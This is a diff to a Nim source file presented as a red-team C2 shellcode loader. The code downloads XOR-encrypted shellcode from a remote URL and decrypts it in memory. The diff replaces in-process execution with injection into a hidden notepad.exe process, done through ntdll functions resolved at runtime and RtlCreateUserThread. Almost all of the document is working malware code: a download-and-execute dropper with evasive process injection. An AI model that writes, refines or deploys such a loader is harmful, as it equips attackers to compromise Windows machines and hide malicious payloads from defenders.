@@ -1,5 +1,5 @@
 ## REDTEAM C2 — Nim WinHTTP shellcode loader
-## Downloads XOR-encrypted shellcode, decrypts in-memory, executes via CreateThread.
+## Downloads XOR-encrypted shellcode, decrypts in-memory, injects into notepad.exe via ntdll.
 ##
 ## Compile-time constants (required):
 ##   -d:payloadUrl=https://host/path.bin
@@ -41,15 +41,16 @@ type
 const
   WINHTTP_ACCESS_TYPE_DEFAULT_PROXY*    = DWORD(0)
   WINHTTP_FLAG_SECURE*                  = DWORD(0x00800000)
-  WINHTTP_ADDREQ_FLAG_ADD*              = DWORD(0x20000000)
 
   MEM_COMMIT*   = DWORD(0x1000)
   MEM_RESERVE*  = DWORD(0x2000)
   PAGE_READWRITE*       = DWORD(0x04)
   PAGE_EXECUTE_READ*    = DWORD(0x20)
-  INFINITE*             = DWORD(0xFFFFFFFF)
 
-# ── WinHTTP imports (dynlib) ──────────────────────────────────────────────────
+  CREATE_NO_WINDOW*          = DWORD(0x08000000)
+  CREATE_BREAKAWAY_FROM_JOB* = DWORD(0x01000000)
+
+# ── WinHTTP imports ───────────────────────────────────────────────────────────
 
 proc WinHttpOpen(
   pszAgentW:       LPCWSTR,
@@ -104,33 +105,34 @@ proc WinHttpCloseHandle(
 
 # ── kernel32 imports ──────────────────────────────────────────────────────────
 
-proc VirtualAlloc(
-  lpAddress:        LPVOID,
-  dwSize:           uint,
-  flAllocationType: DWORD,
-  flProtect:        DWORD
-): LPVOID {.importc: "VirtualAlloc", dynlib: "kernel32.dll", stdcall.}
+proc CreateProcessA(
+  lpApplicationName:    cstring,
+  lpCommandLine:        cstring,
+  lpProcessAttributes:  pointer,
+  lpThreadAttributes:   pointer,
+  bInheritHandles:      BOOL,
+  dwCreationFlags:      DWORD,
+  lpEnvironment:        pointer,
+  lpCurrentDirectory:   cstring,
+  lpStartupInfo:        pointer,
+  lpProcessInformation: pointer
+): BOOL {.importc: "CreateProcessA", dynlib: "kernel32.dll", stdcall.}
 
-proc VirtualProtect(
-  lpAddress:      LPVOID,
-  dwSize:         uint,
-  flNewProtect:   DWORD,
-  lpflOldProtect: ptr DWORD
-): BOOL {.importc: "VirtualProtect", dynlib: "kernel32.dll", stdcall.}
+proc Sleep(dwMilliseconds: DWORD) {.importc: "Sleep", dynlib: "kernel32.dll", stdcall.}
 
-proc CreateThread(
-  lpThreadAttributes: pointer,
-  dwStackSize:        uint,
-  lpStartAddress:     LPVOID,
-  lpParameter:        LPVOID,
-  dwCreationFlags:    DWORD,
-  lpThreadId:         ptr DWORD
-): HANDLE {.importc: "CreateThread", dynlib: "kernel32.dll", stdcall.}
+proc CloseHandle(hObject: HANDLE): BOOL {.importc: "CloseHandle", dynlib: "kernel32.dll", stdcall.}
 
-proc WaitForSingleObject(
-  hHandle:        HANDLE,
-  dwMilliseconds: DWORD
-): DWORD {.importc: "WaitForSingleObject", dynlib: "kernel32.dll", stdcall.}
+proc GetModuleHandleA(lpModuleName: cstring): HANDLE {.importc: "GetModuleHandleA", dynlib: "kernel32.dll", stdcall.}
+
+proc GetProcAddress(hModule: HANDLE, lpProcName: cstring): pointer {.importc: "GetProcAddress", dynlib: "kernel32.dll", stdcall.}
+
+# ── ntdll proc types (resolved at runtime via GetProcAddress) ─────────────────
+
+type
+  NtAllocVMFn   = proc(ph: HANDLE, ba: ptr pointer, zb: uint, sz: ptr uint, at: DWORD, pr: DWORD): int32 {.stdcall.}
+  NtWriteVMFn   = proc(ph: HANDLE, ba: pointer, buf: pointer, cnt: uint32, wb: ptr uint32): int32 {.stdcall.}
+  NtProtVMFn    = proc(ph: HANDLE, ba: ptr pointer, sz: ptr uint, np: DWORD, op: ptr DWORD): int32 {.stdcall.}
+  RtlCreateUTFn = proc(ph: HANDLE, sd: pointer, sus: int32, szb: uint32, stres: pointer, stcom: pointer, sa: pointer, sp: pointer, th: ptr HANDLE, ci: pointer): int32 {.stdcall.}
 
 # ── URL parsing helper ────────────────────────────────────────────────────────
 
@@ -153,7 +155,6 @@ proc parseUrl(raw: string): ParsedUrl =
   elif s.startsWith("http://"):
     s = s[7..^1]
 
-  # split host[:port] from path
   let slashIdx = s.find('/')
   var hostPart: string
   if slashIdx < 0:
@@ -163,7 +164,6 @@ proc parseUrl(raw: string): ParsedUrl =
     hostPart = s[0..slashIdx-1]
     result.path = s[slashIdx..^1]
 
-  # split host:port
   let colonIdx = hostPart.rfind(':')
   if colonIdx > 0:
     result.host = hostPart[0..colonIdx-1]
@@ -185,7 +185,6 @@ proc fromHex(s: string): seq[byte] =
 # ── Wide string helper ────────────────────────────────────────────────────────
 
 proc toWide(s: string): seq[uint16] =
-  ## Convert ASCII/UTF-8 string to null-terminated UTF-16LE seq.
   result = newSeq[uint16](s.len + 1)
   for i, c in s:
     result[i] = uint16(ord(c))
@@ -203,15 +202,10 @@ proc downloadShellcode(url: string): seq[byte] =
   let wHost   = toWide(parsed.host)
   let wVerb   = toWide("GET")
   let wPath   = toWide(parsed.path)
-  let wEmpty  = toWide("")
 
   let isHttps = parsed.scheme == "https"
 
-  let hSession = WinHttpOpen(
-    wptr(wAgent),
-    WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
-    nil, nil, 0
-  )
+  let hSession = WinHttpOpen(wptr(wAgent), WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, nil, nil, 0)
   if hSession == 0: return @[]
   defer: discard WinHttpCloseHandle(hSession)
 
@@ -220,25 +214,19 @@ proc downloadShellcode(url: string): seq[byte] =
   defer: discard WinHttpCloseHandle(hConnect)
 
   let reqFlags = if isHttps: WINHTTP_FLAG_SECURE else: DWORD(0)
-  let hRequest = WinHttpOpenRequest(
-    hConnect, wptr(wVerb), wptr(wPath),
-    nil, nil, nil, reqFlags
-  )
+  let hRequest = WinHttpOpenRequest(hConnect, wptr(wVerb), wptr(wPath), nil, nil, nil, reqFlags)
   if hRequest == 0: return @[]
   defer: discard WinHttpCloseHandle(hRequest)
 
   if WinHttpSendRequest(hRequest, nil, 0, nil, 0, 0, 0) == 0: return @[]
   if WinHttpReceiveResponse(hRequest, nil) == 0: return @[]
 
-  # Read response body in 64 KB chunks
   const chunkSize = 65536
   var buf = newSeq[byte](chunkSize)
   while true:
     var bytesRead: DWORD = 0
-    if WinHttpReadData(hRequest, addr buf[0], chunkSize, addr bytesRead) == 0:
-      break
-    if bytesRead == 0:
-      break
+    if WinHttpReadData(hRequest, addr buf[0], chunkSize, addr bytesRead) == 0: break
+    if bytesRead == 0: break
     result.add(buf[0..bytesRead-1])
 
 # ── XOR decrypt ──────────────────────────────────────────────────────────────
@@ -249,27 +237,61 @@ proc xorDecrypt(data: var seq[byte]; key: seq[byte]) =
   for i in 0..<data.len:
     data[i] = data[i] xor key[i mod klen]
 
-# ── Execute shellcode in-process ──────────────────────────────────────────────
+# ── Process injection via ntdll (notepad.exe host process) ───────────────────
 
-proc execShellcode(sc: seq[byte]) =
+proc injectAndExec(sc: seq[byte]) =
   if sc.len == 0: return
 
-  # Allocate RW memory
-  let mem = VirtualAlloc(nil, uint(sc.len), MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
-  if mem == nil: return
+  # STARTUPINFOA is 104 bytes on Win64; PROCESS_INFORMATION is 24 bytes
+  var si: array[104, byte]
+  var pi: array[24, byte]
+  cast[ptr uint32](addr si[0])[] = 104  # cb = sizeof(STARTUPINFOA)
 
-  # Copy shellcode
-  copyMem(mem, unsafeAddr sc[0], sc.len)
+  let notepad = "C:\\Windows\\System32\\notepad.exe"
+  var ok = CreateProcessA(notepad.cstring, nil, nil, nil, 0,
+                          CREATE_NO_WINDOW or CREATE_BREAKAWAY_FROM_JOB,
+                          nil, nil, addr si[0], addr pi[0])
+  if ok == 0:
+    ok = CreateProcessA(notepad.cstring, nil, nil, nil, 0,
+                        CREATE_NO_WINDOW, nil, nil, addr si[0], addr pi[0])
+  if ok == 0: return
+  Sleep(500)
 
-  # Flip to RX
-  var oldProt: DWORD
-  discard VirtualProtect(mem, uint(sc.len), PAGE_EXECUTE_READ, addr oldProt)
+  let hProcess = cast[ptr HANDLE](addr pi[0])[]
+  let hThread  = cast[ptr HANDLE](addr pi[8])[]
 
-  # Create thread and wait
-  var tid: DWORD
-  let hThread = CreateThread(nil, 0, mem, nil, 0, addr tid)
-  if hThread == 0: return
-  discard WaitForSingleObject(hThread, INFINITE)
+  let ntdll = GetModuleHandleA("ntdll.dll")
+  if ntdll == 0:
+    discard CloseHandle(hProcess); discard CloseHandle(hThread); return
+
+  let ntAlloc = cast[NtAllocVMFn](GetProcAddress(ntdll, "NtAllocateVirtualMemory"))
+  let ntWrite = cast[NtWriteVMFn](GetProcAddress(ntdll, "NtWriteVirtualMemory"))
+  let ntProt  = cast[NtProtVMFn](GetProcAddress(ntdll, "NtProtectVirtualMemory"))
+  let rtlUT   = cast[RtlCreateUTFn](GetProcAddress(ntdll, "RtlCreateUserThread"))
+  if ntAlloc == nil or ntWrite == nil or ntProt == nil or rtlUT == nil:
+    discard CloseHandle(hProcess); discard CloseHandle(hThread); return
+
+  # Allocate RW in remote process
+  var remoteAddr: pointer = nil
+  var sz: uint = uint(sc.len)
+  discard ntAlloc(hProcess, addr remoteAddr, 0, addr sz, uint32(MEM_COMMIT or MEM_RESERVE), uint32(PAGE_READWRITE))
+  if remoteAddr == nil:
+    discard CloseHandle(hProcess); discard CloseHandle(hThread); return
+
+  # Write shellcode
+  var wb: uint32 = 0
+  discard ntWrite(hProcess, remoteAddr, unsafeAddr sc[0], uint32(sc.len), addr wb)
+
+  # Flip to RX — sz is page-aligned from NtAllocateVirtualMemory, use it directly
+  var oldProt: DWORD = 0
+  discard ntProt(hProcess, addr remoteAddr, addr sz, uint32(PAGE_EXECUTE_READ), addr oldProt)
+
+  # Spawn remote thread — agent runs in notepad.exe independently
+  var hRemoteThread: HANDLE = 0
+  discard rtlUT(hProcess, nil, 0, 0, nil, nil, remoteAddr, nil, addr hRemoteThread, nil)
+  if hRemoteThread != 0: discard CloseHandle(hRemoteThread)
+  discard CloseHandle(hProcess)
+  discard CloseHandle(hThread)
 
 # ── Entry point ───────────────────────────────────────────────────────────────
 
@@ -280,7 +302,7 @@ proc main() =
   let key = fromHex(XorKey)
   xorDecrypt(sc, key)
 
-  execShellcode(sc)
+  injectAndExec(sc)
 
 when isMainModule:
   main()
